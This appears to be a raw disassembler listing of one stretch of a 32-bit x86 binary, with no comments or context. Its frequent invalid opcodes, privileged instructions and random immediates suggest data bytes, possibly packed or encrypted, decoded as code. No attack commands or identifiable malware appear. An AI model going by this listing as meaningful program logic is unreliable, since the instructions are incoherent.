  41afc7:	pop    ss
  41afc8:	int    0xbd
  41afca:	mov    cl,BYTE PTR [edx+0x734086d2]
  41afd0:	sub    eax,0x242fed33
  41afd5:	mov    eax,ds:0x2d0f9e93
  41afda:	mov    esi,0xb573fafe
  41afdf:	xor    eax,0x252bc11
  41afe4:	std    
  41afe5:	cmp    BYTE PTR [eax],bl
  41afe7:	adc    DWORD PTR [eax-0x737bdf1d],ecx
  41afed:	add    DWORD PTR [ecx],0x4f2f420b
  41aff3:	stos   BYTE PTR es:[edi],al
  41aff4:	shr    edi,cl
  41aff6:	xor    ch,cl
  41aff8:	gs pop eax
  41affa:	pop    edx
  41affb:	mov    DWORD PTR [edi],eax
  41affd:	inc    ebx
  41affe:	jb     0x41b039
  41b000:	loope  0x41afbb
  41b002:	call   DWORD PTR [ebx]
  41b004:	dec    edx
  41b005:	pop    ebp
  41b006:	clc    
  41b007:	push   es
  41b008:	or     esi,eax
  41b00a:	mov    es,WORD PTR [ebp+0x6f]
  41b00d:	test   DWORD PTR [esi],edx
  41b00f:	cmc    
  41b010:	out    dx,eax
  41b011:	ja     0x41afaa
  41b013:	pop    ss
  41b014:	xlat   BYTE PTR ds:[ebx]
  41b015:	inc    edi
  41b016:	cmovnp ecx,DWORD PTR [ebx]
  41b019:	cmp    bl,BYTE PTR [edi-0x3701fdc3]
  41b01f:	pop    edi
  41b020:	cwde   
  41b021:	mov    bh,0xe7
  41b023:	add    bl,cl
  41b025:	adc    al,0xdf
  41b027:	rcr    esi,1
  41b029:	xchg   DWORD PTR [ebp-0x52],esp
  41b02c:	ror    DWORD PTR [ebp-0x7d],1
  41b02f:	add    ch,BYTE PTR [esi]
  41b031:	sub    cl,dl
  41b033:	adc    eax,0x94cc160b
  41b038:	add    al,0xea
  41b03a:	(bad)  
  41b03b:	inc    esi
  41b03c:	call   0x55ffbb26
  41b041:	gs fneni(8087 only) 
  41b044:	sub    BYTE PTR [ecx-0x41],al
  41b047:	lock mov dl,0xf5
  41b04a:	rcr    DWORD PTR [ebx-0x34],1
  41b04d:	test   DWORD PTR [esi],0xfbd8668f
  41b053:	bound  ebx,QWORD PTR [ecx-0x42]
  41b056:	cmp    al,0xf6
  41b058:	push   esi
  41b059:	inc    eax
  41b05a:	test   eax,0x83db0e9a
  41b05f:	jb     0x41b0d9
  41b061:	sub    ch,ah
  41b063:	(bad)  
  41b065:	pop    esi
  41b066:	add    al,0x5c
  41b068:	mov    ch,0x22
  41b06a:	(bad)  
  41b06b:	in     eax,0x24
  41b06d:	jns    0x41b03d
  41b06f:	mov    WORD PTR [esi-0x447282da],gs
  41b075:	or     DWORD PTR [eax-0x73],edi
  41b078:	pop    ds
  41b079:	mov    ds:0x55ed3bc8,eax
  41b07e:	popf   
  41b07f:	sbb    eax,0xb476b275
  41b084:	and    ch,BYTE PTR [eax-0x7]
  41b087:	test   eax,0x890dac99
  41b08c:	in     al,dx
  41b08d:	jp     0x41b03b
  41b08f:	inc    esp
  41b090:	das    
  41b091:	jl     0x41b0b1
  41b093:	cmp    eax,0x47a36860
  41b098:	out    dx,eax
  41b099:	sbb    ebp,DWORD PTR [ecx+0x4a]
  41b09c:	(bad)  
  41b09d:	adc    DWORD PTR [edi+ebx*8],0xe0ede552
  41b0a4:	inc    esp
  41b0a5:	aad    0x15
  41b0a7:	ja     0x41b098
  41b0a9:	or     eax,0x16016cfb
  41b0ae:	and    eax,0x2a4efd6b
  41b0b3:	or     al,0xc2
  41b0b5:	out    0xd0,eax
  41b0b7:	or     edx,esp
  41b0b9:	jbe    0x41b078
  41b0bb:	sub    DWORD PTR [edx+0x2971c7df],0x6b
  41b0c2:	fsubr  QWORD PTR [eax]
  41b0c4:	push   ecx
  41b0c5:	inc    esi
  41b0c6:	xchg   ebx,eax
  41b0c7:	sbb    ecx,DWORD PTR [eax-0x53]
  41b0ca:	shl    DWORD PTR [ebp+eiz*4+0x9],1
  41b0ce:	daa    
  41b0cf:	inc    esp
  41b0d0:	loopne 0x41b146
  41b0d2:	inc    edx
  41b0d3:	ror    DWORD PTR [edi+ebx*1],0x10
  41b0d7:	hlt    
  41b0d8:	adc    ebx,DWORD PTR ds:0x8002f2b2
  41b0de:	jae    0x41b121
  41b0e0:	lahf   
  41b0e1:	and    al,0xed
  41b0e3:	jmp    0xd16e60e1
  41b0e8:	js     0x41b0d4
  41b0ea:	inc    ecx
  41b0eb:	dec    edi
  41b0ec:	push   es
  41b0ed:	lds    esi,FWORD PTR [esi-0x1dbddd5e]
  41b0f3:	inc    ecx
  41b0f4:	(bad)  
  41b0f5:	sub    al,0x7a
  41b0f7:	sahf   
  41b0f8:	jne    0x41b0e6
  41b0fa:	adc    al,0x73
  41b0fc:	push   ebp
  41b0fd:	mov    cl,0x2c
  41b0ff:	xchg   BYTE PTR [edi],cl
  41b101:	out    dx,eax
  41b102:	mov    eax,0xb44ece8d
  41b107:	inc    ecx
  41b108:	dec    esp
  41b109:	test   BYTE PTR [edx+0x5fa6e016],dl
  41b10f:	call   0x5877e298
  41b114:	xor    DWORD PTR [ebp-0x25],edx
  41b117:	mov    eax,ds:0x9ca6c1e
  41b11c:	ret    
  41b11d:	push   ebx
  41b11e:	pop    ecx
  41b11f:	xor    bl,dh
  41b121:	add    ch,BYTE PTR [edi+ebp*1-0x47]
  41b125:	clc    
  41b126:	dec    eax
  41b127:	push   es
  41b128:	jb     0x41b0dd
  41b12a:	push   ebx
  41b12b:	in     al,dx
  41b12c:	adc    dh,BYTE PTR [esi]
  41b12e:	vpsrad ymm1,ymm4,XMMWORD PTR [edx]
  41b132:	xor    al,0x88
  41b134:	and    BYTE PTR [eax],dl
  41b136:	sbb    eax,0x95202016
  41b13b:	mov    ds:0xe57df0fb,eax
  41b140:	cmp    BYTE PTR [esi-0x16],dl
  41b143:	daa    
  41b144:	push   edi
  41b145:	sbb    BYTE PTR [ecx],bl
  41b147:	stc    
  41b148:	mov    ecx,0x24dfce23
  41b14d:	ins    DWORD PTR es:[edi],dx
  41b14e:	add    BYTE PTR [eax],al
  41b150:	add    BYTE PTR [eax],al
  41b152:	cld    
  41b153:	es out dx,eax
  41b155:	mov    eax,ds:0x7ffee9ff
  41b15a:	jmp    edx
  41b15c:	fdivp  st(6),st
  41b15e:	push   0x1b
  41b160:	popa   
  41b161:	sbb    al,0xa1
  41b163:	sub    eax,0x4f40001
  41b168:	add    BYTE PTR [eax],al
  41b16a:	iret   
  41b16b:	cmp    eax,0x858c2718
  41b170:	in     al,dx
  41b171:	fdivr  QWORD PTR [esi]
  41b173:	sbb    BYTE PTR [edx-0x34fa1c51],ah
  41b179:	stc    
  41b17a:	ins    BYTE PTR es:[edi],dx
  41b17b:	icebp  
  41b17c:	pop    esi
  41b17d:	cmc    
  41b17e:	cld    
  41b17f:	or     eax,0x2d47f54c
  41b184:	pop    ds
  41b185:	nop
  41b186:	sbb    ch,BYTE PTR [edx-0x5f407081]
  41b18c:	icebp  
  41b18d:	aas    
  41b18e:	mov    ds:0x810e098f,al
  41b193:	pop    es
  41b194:	pop    DWORD PTR [ebx]
  41b196:	dec    edi
  41b197:	cmp    esi,esp
  41b199:	xchg   ch,cl
  41b19b:	sbb    ecx,DWORD PTR [edi]
  41b19d:	inc    DWORD PTR [ebp-0x17a61f60]
  41b1a3:	jns    0x41b1be
  41b1a5:	pop    DWORD PTR [esi+ebx*4]
  41b1a8:	cmp    dl,al
  41b1aa:	hlt    
  41b1ab:	inc    esi
  41b1ac:	into   
  41b1ad:	enter  0xd635,0x89
  41b1b1:	jp     0x41b17d
  41b1b3:	sbb    al,0x42
  41b1b5:	in     eax,0xb0
  41b1b7:	xor    DWORD PTR ds:0x8480be0,edi
  41b1bd:	xor    ecx,DWORD PTR [eax-0x68]
  41b1c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1c1:	mov    edx,0x1a6c0eee
  41b1c6:	int    0x6f
  41b1c8:	cmc    
  41b1c9:	sbb    DWORD PTR [esi+edx*8],0x24
  41b1cd:	ins    DWORD PTR es:[edi],dx
  41b1ce:	aam    0x3d
  41b1d0:	sub    ebp,edx
  41b1d2:	fidivr WORD PTR [ebx-0x2b]
  41b1d5:	ret    
  41b1d6:	pop    esp
  41b1d7:	lds    edx,FWORD PTR [edi-0x4c]
  41b1da:	lods   eax,DWORD PTR ds:[esi]
  41b1db:	pop    eax
  41b1dc:	mov    BYTE PTR [ebx-0x286429b7],0xb5
  41b1e3:	cmp    esi,DWORD PTR [ecx-0x7bb44b54]
  41b1e9:	dec    edi
  41b1ea:	aaa    
  41b1eb:	sbb    eax,0xffc61d19
  41b1f0:	stos   DWORD PTR es:[edi],eax
  41b1f1:	fidivr WORD PTR [ecx]
  41b1f3:	loopne 0x41b193
  41b1f5:	dec    esp
  41b1f6:	mov    esi,0x69894b03
  41b1fb:	mov    bh,0x46
  41b1fd:	data16 jl 0x41b24f
  41b200:	call   0xf01ef1e1
  41b205:	sbb    eax,0xd4f22e7b
  41b20a:	dec    edx
  41b20b:	adc    dl,0xa3
  41b20e:	bound  edi,QWORD PTR [edx]
  41b210:	gs jne 0x41b285
  41b213:	adc    eax,0xaf76c6ec
  41b218:	repnz cld 
  41b21a:	xchg   DWORD PTR [eax],esi
  41b21c:	loopne 0x41b247
  41b21e:	sub    eax,0xaa0d5b03
  41b223:	cs push es
  41b225:	dec    esi
  41b226:	xchg   bx,ax
  41b228:	bound  ebx,QWORD PTR [eax-0x6a]
  41b22b:	into   
  41b22c:	or     BYTE PTR [ebp-0x7ee73729],bl
  41b232:	sahf   
  41b233:	xchg   ecx,eax
  41b234:	test   al,0x86
  41b236:	xchg   esi,eax
  41b237:	fdivr  QWORD PTR [di]
  41b23a:	dec    ebx
  41b23b:	or     al,0x3f
  41b23d:	clc    
  41b23e:	jno    0x41b20d
  41b240:	or     ah,al
  41b242:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b243:	pop    ebx
  41b244:	push   es
  41b245:	test   al,0x23
  41b247:	test   DWORD PTR [eax+0x3eff0202],ebx
  41b24d:	sub    esp,edx
  41b24f:	cli    
  41b250:	mov    eax,0x7447d10e
  41b255:	test   BYTE PTR [esi-0x6c69c00f],al
  41b25b:	xor    esp,DWORD PTR [edx-0x53]
  41b25e:	into   
  41b25f:	xor    BYTE PTR [edi+0x63e6bb32],dl
  41b265:	pop    ds
  41b266:	nop
  41b267:	push   esp
  41b268:	xor    esp,DWORD PTR [eax+0x75]
  41b26b:	mov    edi,0xfb1ab4a0
  41b270:	mov    dh,BYTE PTR [edx+0x56]
  41b273:	sub    eax,DWORD PTR [edx]
  41b275:	jecxz  0x41b21e
  41b277:	or     BYTE PTR [edi+0xfb2ee67],0xcf
  41b27e:	lods   eax,DWORD PTR ds:[esi]
  41b27f:	xchg   esi,eax
  41b280:	(bad)  
  41b281:	cmp    al,0x41
  41b283:	rol    cl,cl
  41b285:	push   eax
  41b286:	ffree  st(4)
  41b288:	ret    
  41b289:	add    al,0x89
  41b28b:	xchg   ebx,eax
  41b28c:	lods   eax,DWORD PTR ds:[esi]
  41b28d:	jecxz  0x41b308
  41b28f:	push   edi
  41b290:	nop
  41b291:	sti    
  41b292:	jae    0x41b303
  41b294:	push   es
  41b295:	mov    ah,BYTE PTR [eax+eiz*8]
  41b298:	and    bh,ch
  41b29a:	jns    0x41b283
  41b29c:	aas    
  41b29d:	sbb    eax,0xa48735e7
  41b2a2:	aad    0x51
  41b2a4:	cli    
  41b2a5:	push   0xddc0ed47
  41b2aa:	aaa    
  41b2ab:	jne    0x41b2d0
  41b2ad:	popa   
  41b2ae:	xor    al,0x69
  41b2b0:	xchg   edi,eax
  41b2b1:	add    BYTE PTR [ebx+0x4b],ch
  41b2b4:	clc    
  41b2b5:	addr16 adc bl,0xa4
  41b2b9:	cmp    bh,0xa
  41b2bc:	hlt    
  41b2bd:	push   es
  41b2be:	ja     0x41b2c9
  41b2c0:	inc    esp
  41b2c1:	sbb    al,0xdb
  41b2c3:	mov    ah,0xb7
  41b2c5:	or     BYTE PTR gs:[esi-0x1d6c0e1c],dl
  41b2cc:	jbe    0x41b34b
  41b2ce:	fcom   st(5)
  41b2d0:	xchg   edx,eax
  41b2d1:	push   DWORD PTR ds:0xe4a6be90
  41b2d7:	pushf  
  41b2d8:	cmp    BYTE PTR [esi],bh
  41b2da:	jbe    0x41b356
  41b2dc:	pop    ss
  41b2dd:	mov    ecx,0x53ba7bb3
  41b2e2:	mov    edi,db7
  41b2e5:	sub    al,0x75
  41b2e7:	ins    DWORD PTR es:[edi],dx
  41b2e8:	jno    0x41b2a3
  41b2ea:	stos   DWORD PTR es:[edi],eax
  41b2eb:	ss cs sti 
  41b2ee:	mov    edi,es
  41b2f0:	jne    0x41b2d8
  41b2f2:	jnp    0x41b2e2
  41b2f4:	jb     0x41b2bc
  41b2f6:	sub    al,0x91
  41b2f8:	push   es
  41b2f9:	gs mov bh,0xb4
  41b2fc:	sub    al,0x9e
  41b2fe:	push   edi
  41b2ff:	pop    edi
  41b300:	out    dx,eax
  41b301:	xchg   ebp,eax
  41b302:	sar    BYTE PTR [ebx],0xb3
  41b305:	cmp    BYTE PTR [ebp+0x5],0xa6
  41b309:	mov    eax,ds:0xbc0df516
  41b30e:	adc    esp,DWORD PTR [edi]
  41b310:	mov    ds:0x3a9c7465,al
  41b315:	dec    edi
  41b316:	ins    DWORD PTR es:[edi],dx
  41b317:	and    al,0x14
  41b319:	sbb    eax,0x540667d6
  41b31e:	lahf   
  41b31f:	xchg   ebp,eax
  41b320:	out    dx,al
  41b321:	xchg   edi,eax
  41b322:	and    ebx,esp
  41b324:	test   BYTE PTR [esi+0x74e7c901],ch
  41b32a:	data16 mov ch,0xf5
  41b32d:	sahf   
  41b32e:	mov    dl,0x36
  41b330:	push   esi
  41b331:	ins    DWORD PTR es:[edi],dx
  41b332:	nop
  41b333:	cmp    ebx,ebx
  41b335:	shl    edx,cl
  41b337:	sbb    esi,DWORD PTR ds:0x84a2bee1
  41b33d:	mov    bl,0xdb
  41b33f:	or     al,0xab
  41b341:	retf   
  41b342:	xor    al,0x7f
  41b344:	or     bl,dh
  41b346:	imul   BYTE PTR [edi+0x40987f02]
  41b34c:	mov    dh,0xb1
  41b34e:	sub    ah,ah
  41b350:	jb     0x41b328
  41b352:	sbb    BYTE PTR [ebp-0x7c3d5b34],al
  41b358:	push   0x68
  41b35a:	inc    eax
  41b35b:	mov    edx,0xfddf8460
  41b360:	xchg   ecx,eax
  41b361:	ss jecxz 0x41b3cc
  41b364:	test   eax,0x96d1cad6
  41b369:	std    
  41b36a:	dec    edx
  41b36b:	aad    0x10
  41b36d:	cmp    eax,DWORD PTR [edi-0x1d]
  41b370:	hlt    
  41b371:	push   cs
  41b372:	xor    DWORD PTR [esi],ecx
  41b374:	and    edi,DWORD PTR [eax+esi*4-0x7dde1678]
  41b37b:	cld    
  41b37c:	pop    ebp
  41b37d:	inc    ecx
  41b37e:	jns    0x41b346
  41b380:	xchg   esi,eax
  41b381:	mov    esp,0xacf2d892
  41b386:	push   edx
  41b387:	es cmp eax,0xbc94bea0
  41b38d:	jmp    0xe582:0x815a152f
  41b394:	(bad)  
  41b395:	sub    esi,DWORD PTR [ecx+0x79a017f3]
  41b39b:	clc    
  41b39c:	cmp    al,0x8d
  41b39e:	clc    
  41b39f:	mov    dl,0xa6
  41b3a1:	mov    dh,0x80
  41b3a3:	push   ss
  41b3a4:	dec    ecx
  41b3a5:	jns    0x41b388
  41b3a7:	jns    0x41b37f
  41b3a9:	mov    al,ds:0xed7409c8
  41b3ae:	and    BYTE PTR [edi-0xd],cl
  41b3b1:	sub    eax,0x1f060dfe
  41b3b6:	cli    
  41b3b7:	dec    esi
  41b3b8:	or     ah,bl
  41b3ba:	stos   DWORD PTR es:[edi],eax
  41b3bb:	push   esp
  41b3bc:	push   ebp
  41b3bd:	in     al,dx
  41b3be:	dec    ecx
  41b3bf:	xchg   esi,eax
  41b3c0:	cli    
  41b3c1:	push   edx
  41b3c2:	ins    DWORD PTR es:[edi],dx
  41b3c3:	mov    DWORD PTR [eax+0x6d8a0d21],eax
  41b3c9:	xchg   ebp,eax
  41b3ca:	pop    ss
  41b3cb:	xchg   ebp,eax
  41b3cc:	imul   ecx,DWORD PTR [eax],0x138b0a06
  41b3d2:	push   ds
  41b3d3:	mov    esi,0x951a7892
  41b3d8:	mov    al,0xcc
  41b3da:	push   ecx
  41b3db:	loop   0x41b38b
  41b3dd:	sub    bl,BYTE PTR [edx+0x5e]
  41b3e0:	mov    WORD PTR [esi+0xef11b9a],ds
  41b3e6:	cmp    eax,0xe197ccdb
  41b3eb:	ds mov ch,0x11
  41b3ee:	mov    cl,0xaf
  41b3f0:	lea    eax,cs:[ecx]
  41b3f3:	fnstsw WORD PTR ds:0x99dbb6d7
  41b3f9:	ret    0xc92b
  41b3fc:	mov    dl,0x73
  41b3fe:	pushf  
  41b3ff:	gs in  eax,dx
  41b401:	dec    ebp
  41b402:	mov    al,bl
  41b404:	cmc    
  41b405:	mov    cl,0x7b
  41b407:	fisub  WORD PTR [edi]
  41b409:	mov    ch,0x4f
  41b40b:	adc    eax,DWORD PTR ds:0x111ea87b
  41b411:	outs   dx,BYTE PTR ds:[esi]
  41b412:	aaa    
  41b413:	push   ds
  41b414:	sbb    al,0xea
  41b416:	sbb    BYTE PTR ds:0xbe5ed65e,0xce
  41b41d:	js     0x41b44b
  41b41f:	mov    ch,0xe7
  41b421:	(bad)  
  41b422:	cmp    esp,DWORD PTR [eax-0xa]
  41b425:	push   ebx
  41b426:	sahf   
  41b427:	inc    esi
  41b428:	push   edi
  41b429:	or     esp,esi
  41b42b:	fisttp WORD PTR [ebx+0x3e]
  41b42e:	popa   
  41b42f:	mov    esi,0xcc43f23c
  41b434:	cmp    eax,0xacfcb27f
  41b439:	ins    DWORD PTR es:[edi],dx
  41b43a:	jmp    0x8989:0xa2df056d
  41b441:	cld    
  41b442:	inc    ebp
  41b443:	std    
  41b444:	in     al,dx
  41b445:	test   al,0x24
  41b447:	pop    ds
  41b448:	in     eax,0xb1
  41b44a:	shl    bh,1
  41b44c:	movlps xmm2,QWORD PTR [edi-0x67]
  41b450:	ret    0x1b7f
  41b453:	sahf   
  41b454:	gs aas 
  41b456:	repz sysenter 
  41b459:	sar    dl,cl
  41b45b:	cmp    DWORD PTR [ecx-0x1c],edi
  41b45e:	and    al,0xe6
  41b460:	arpl   WORD PTR [ecx],sp
  41b462:	mov    edi,0x564c62d
  41b467:	pop    esp
  41b469:	mov    ch,0xcb
  41b46b:	in     al,dx
  41b46c:	pop    ebx
  41b46d:	xchg   edi,eax
  41b46e:	adc    ebp,DWORD PTR [edx-0xd]
  41b471:	fmul   DWORD PTR [ebx]
  41b473:	retf   0x6c83
  41b476:	sub    BYTE PTR ds:0x3b85e7b7,ah
  41b47c:	xor    DWORD PTR [ebx],ebp
  41b47e:	pmuludq xmm4,xmm7
  41b482:	or     al,0xda
  41b484:	mov    ebx,0xfaf25302
  41b489:	add    al,0x21
  41b48b:	push   ebx
  41b48c:	sub    eax,0xb11a817f
  41b491:	xchg   esi,eax
  41b492:	sbb    BYTE PTR [esi-0x1b26ccdc],0x55
  41b499:	mov    esi,0xbdcd3a3c
  41b49e:	stos   BYTE PTR es:[edi],al
  41b49f:	fucomip st,st(0)
  41b4a1:	mov    eax,ds:0x6e80b238
  41b4a6:	push   esp
  41b4a7:	dec    esp
  41b4a8:	ret    
  41b4a9:	inc    ebp
  41b4aa:	sti    
  41b4ab:	dec    edx
  41b4ac:	mov    ecx,0x603d9c5b
  41b4b1:	xchg   edi,eax
  41b4b2:	push   cs
  41b4b3:	test   eax,0x901d4712
  41b4b8:	sbb    cl,ah
  41b4ba:	mov    eax,0xcf2158aa
  41b4bf:	and    DWORD PTR [edx+0x35],eax
  41b4c2:	loopne 0x41b47b
  41b4c4:	lods   al,BYTE PTR ds:[esi]
  41b4c5:	xchg   ecx,eax
  41b4c6:	(bad)  
  41b4c8:	mov    eax,0xf288e237
  41b4cd:	mov    bh,0x88
  41b4cf:	mov    bl,0xba
  41b4d1:	fwait
  41b4d2:	jbe    0x41b466
  41b4d4:	(bad)  
  41b4d5:	sub    eax,0x1b0ffbde
  41b4da:	xlat   BYTE PTR ds:[ebx]
  41b4db:	int3   
  41b4dc:	pop    edi
  41b4dd:	cmp    al,0xe6
  41b4df:	xchg   ebx,eax
  41b4e0:	and    edi,eax
  41b4e2:	loop   0x41b542
  41b4e4:	xchg   ebp,eax
  41b4e5:	int3   
  41b4e6:	pop    esi
  41b4e7:	in     eax,dx
  41b4e8:	jg     0x41b50c
  41b4ea:	(bad)  
  41b4eb:	es ss out dx,eax
  41b4ee:	sbb    BYTE PTR [ebp-0x14],dl
  41b4f1:	adc    al,0x1c
  41b4f3:	xlat   BYTE PTR ds:[ebx]
  41b4f4:	xchg   ebx,eax
  41b4f5:	push   es
  41b4f6:	xchg   edi,eax
  41b4f7:	add    DWORD PTR [edx],edi
  41b4f9:	pop    eax
  41b4fa:	ret    
  41b4fb:	xchg   ebp,eax
  41b4fc:	ins    BYTE PTR es:[edi],dx
  41b4fd:	js     0x41b57d
  41b4ff:	mov    dh,0xe9
  41b501:	fdiv   QWORD PTR [edx]
  41b503:	cmp    DWORD PTR [edi],ecx
  41b505:	inc    ecx
  41b506:	int3   
  41b507:	pop    ecx
  41b508:	mov    dl,0x8d
  41b50a:	xor    al,0xcc
  41b50c:	xchg   BYTE PTR [ebp+0x46],bh
  41b50f:	sbb    al,0x2
  41b511:	(bad)  
  41b512:	sub    esi,ebp
  41b514:	cmp    BYTE PTR [edi+0x342eb4e3],ah
  41b51a:	das    
  41b51b:	adc    BYTE PTR ds:0x5fe404c9,dh
  41b521:	xchg   ebp,eax
  41b522:	cmp    esp,DWORD PTR [ebp-0x4c]
  41b525:	pop    ebp
  41b526:	inc    ebx
  41b527:	push   esp
  41b528:	into   
  41b529:	js     0x41b55c
  41b52b:	dec    eax
  41b52c:	push   ecx
  41b52d:	mov    ds:0x84c2154,al
  41b532:	and    DWORD PTR [edi-0x3bc24c05],ecx
  41b538:	inc    edx
  41b539:	or     eax,0x3781678
  41b53e:	inc    edi
  41b53f:	clc    
  41b540:	lods   al,BYTE PTR ds:[esi]
  41b541:	or     esp,ebp
  41b543:	push   0x7d
  41b545:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b546:	inc    esi
  41b547:	inc    edi
  41b548:	leave  
  41b549:	jp     0x41b530
  41b54b:	bound  esi,QWORD PTR [edi+0x2a]
  41b54e:	enter  0xdc02,0x2
  41b552:	dec    ebx
  41b553:	push   ebx
  41b554:	dec    ebx
  41b555:	inc    ecx
  41b556:	push   ss
  41b557:	ins    DWORD PTR es:[edi],dx
  41b558:	or     ebp,ebx
  41b55a:	fucomi st,st(4)
  41b55c:	fwait
  41b55d:	test   eax,0xf672b8db
  41b562:	(bad)  
  41b563:	jnp    0x41b4fd
  41b565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b566:	pusha  
  41b567:	popf   
  41b568:	mov    ebp,0x3221b187
  41b56d:	xor    ah,ch
  41b56f:	lods   eax,DWORD PTR ds:[esi]
  41b570:	jnp    0x41b570
  41b572:	dec    edx
  41b573:	sahf   
  41b574:	jg     0x41b58b
  41b576:	sahf   
  41b577:	xor    al,0xbc
  41b579:	jp     0x41b571
  41b57b:	sub    eax,0x252493d0
  41b580:	test   bl,bl
  41b582:	pusha  
  41b583:	cmc    
  41b584:	jne    0x41b59e
  41b586:	or     eax,0xfe3db8d1
  41b58b:	cmc    
  41b58c:	int3   
  41b58d:	pusha  
  41b58e:	jl     0x41b543
  41b590:	push   eax
  41b591:	jle    0x41b564
  41b593:	xlat   BYTE PTR ds:[ebx]
  41b594:	mov    edx,0xed2b6c2a
  41b599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b59a:	in     eax,0xe7
  41b59c:	sub    ecx,DWORD PTR [ebx-0x2f19f119]
  41b5a2:	sbb    DWORD PTR [ebx-0x46],esp
  41b5a5:	fcomp  DWORD PTR [ecx-0x7de5506d]
  41b5ab:	push   edx
  41b5ac:	jnp    0x41b5b0
  41b5ae:	lahf   
  41b5af:	dec    esp
  41b5b0:	cli    
  41b5b1:	and    eax,0xfa1baa59
  41b5b6:	loop   0x41b60b
  41b5b8:	mov    BYTE PTR [ebp-0xa55a163],dl
  41b5be:	dec    ebx
  41b5bf:	ret    0x2aa5
  41b5c2:	xchg   edx,eax
  41b5c3:	hlt    
  41b5c4:	fs pop ebx
  41b5c6:	xor    DWORD PTR [ecx-0x693957bd],ecx
  41b5cc:	mov    ds:0xc2cdbe9a,al
  41b5d1:	sahf   
  41b5d2:	rol    dh,1
  41b5d4:	jle    0x41b5e5
  41b5d6:	mov    eax,0x8a0995ec
  41b5db:	dec    esi
  41b5dc:	and    al,0xe2
  41b5de:	rol    DWORD PTR [ebp-0x5b116048],cl
  41b5e4:	lock xor eax,DWORD PTR [ecx]
  41b5e7:	inc    ebx
  41b5e8:	rcr    DWORD PTR [esi-0x26f94564],0xfa
  41b5ef:	outs   dx,DWORD PTR ds:[esi]
  41b5f0:	call   0xb17327f9
  41b5f5:	push   edx
  41b5f6:	repz inc ebx
  41b5f8:	fisttp WORD PTR [ebp+0x1f87ea9f]
  41b5fe:	mov    dh,0xec
  41b600:	retf   
  41b601:	mov    DWORD PTR [esi-0x6f],ebx
  41b604:	jle    0x41b60f
  41b606:	adc    BYTE PTR [esp+edx*8],al
  41b609:	mov    eax,0xdbcdbe07
  41b60e:	scas   eax,DWORD PTR es:[edi]
  41b60f:	test   bl,ch
  41b611:	lock pop esi
  41b613:	inc    eax
  41b614:	je     0x41b5cf
  41b616:	dec    esi
  41b617:	dec    ecx
  41b618:	adc    ch,bl
  41b61a:	pop    eax
  41b61b:	in     al,0x35
  41b61d:	cmc    
  41b61e:	out    0xd1,ax
  41b621:	mov    esi,0x5cb0a922
  41b626:	add    edx,DWORD PTR [ecx-0x38]
  41b629:	sahf   
  41b62a:	push   ebx
  41b62b:	iret   
  41b62c:	cmp    eax,0x294c7956
  41b631:	xor    edi,edx
  41b633:	sub    BYTE PTR [ebx+ebx*4-0x59],ch
  41b637:	xor    BYTE PTR [eax-0x5bc65262],bl
  41b63d:	hlt    
  41b63e:	enter  0x3f59,0x77
  41b642:	add    BYTE PTR [ecx-0x26],cl
  41b645:	test   al,0x62
  41b647:	(bad)  
  41b648:	xchg   edx,eax
  41b649:	sub    cl,BYTE PTR [esi]
  41b64b:	sub    edx,DWORD PTR [edx+edi*8]
  41b64e:	xchg   esp,eax
  41b64f:	xchg   edi,eax
  41b650:	add    DWORD PTR [edx+0x42ce1ef2],ecx
  41b656:	mov    ecx,0x570b1e0a
  41b65b:	je     0x41b66a
  41b65d:	mov    bh,0x0
  41b65f:	add    BYTE PTR [eax],al
  41b661:	add    dh,al
  41b663:	aaa    
  41b664:	sti    
  41b665:	addr16 sti 
  41b667:	out    dx,eax
  41b668:	fidiv  WORD PTR [edi-0x5c01975c]
  41b66e:	ret    
  41b66f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b670:	inc    eax
  41b671:	aam    0x95
  41b673:	xor    al,BYTE PTR [ecx]
  41b675:	add    ah,dh
  41b677:	add    al,0x0
  41b679:	add    BYTE PTR [eax+edi*1+0x18d043d4],ch
  41b680:	js     0x41b6b9
  41b682:	sti    
  41b683:	xor    BYTE PTR [ecx],ah
  41b685:	or     DWORD PTR [edx+0x17e5b515],esp
  41b68b:	repnz adc al,0x8d
  41b68e:	inc    ecx
  41b68f:	mov    eax,0x8c21aeac
  41b694:	sbb    eax,0x7026f4ea
  41b699:	ror    bl,1
  41b69b:	(bad)  
  41b69c:	mov    es,WORD PTR [edx]
  41b69e:	gs jecxz 0x41b71f
  41b6a1:	push   ebp
  41b6a2:	mov    eax,0x89c80371
  41b6a7:	mov    ebp,ebx
  41b6a9:	dec    eax
  41b6aa:	addr16 mov esi,0xe0c3b001
  41b6b0:	pop    esi
  41b6b1:	sub    cl,BYTE PTR [eax-0x4bcf4d1e]
  41b6b7:	js     0x41b6a1
  41b6b9:	jmp    0x2c48b792
  41b6be:	outs   dx,BYTE PTR ds:[esi]
  41b6bf:	(bad)  
  41b6c0:	jmp    0x8bd7:0xcea42f6a
  41b6c7:	mov    ch,0x89
  41b6c9:	add    eax,edx
  41b6cb:	sub    ecx,DWORD PTR [edx+0x78]
  41b6ce:	adc    eax,0xad213751
  41b6d3:	addr16 pop esi
  41b6d5:	inc    esp
  41b6d6:	gs push 0xe3163163
  41b6dc:	inc    DWORD PTR [ebx+eax*8-0x1552f56]
  41b6e3:	adc    eax,0xd947958e
  41b6e8:	into   
  41b6e9:	(bad)  
  41b6eb:	inc    edi
  41b6ec:	pop    ebp
  41b6ed:	int    0x5c
  41b6ef:	mov    ebp,0x78875a51
  41b6f4:	inc    ebp
  41b6f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6f6:	loopne 0x41b6ac
  41b6f8:	inc    edi
  41b6f9:	or     ah,bl
  41b6fb:	sbb    ebx,edi
  41b6fd:	xchg   BYTE PTR [ebx-0x5e518d5d],ch
  41b703:	out    0x7c,eax
  41b705:	jnp    0x41b772
  41b707:	xor    edi,esi
  41b709:	cwde   
  41b70a:	mov    ds:0x9d69c4c8,al
  41b70f:	push   edi
  41b710:	sahf   
  41b711:	jns    0x41b771
  41b713:	adc    DWORD PTR [edi+0x4d],0xfffffffa
  41b717:	ds inc ebx
  41b719:	jmp    0x41b778
  41b71b:	fnstsw WORD PTR [ecx-0x1f]
  41b71e:	idiv   DWORD PTR [esi+0x1b]
  41b721:	mov    ebp,0x19317baf
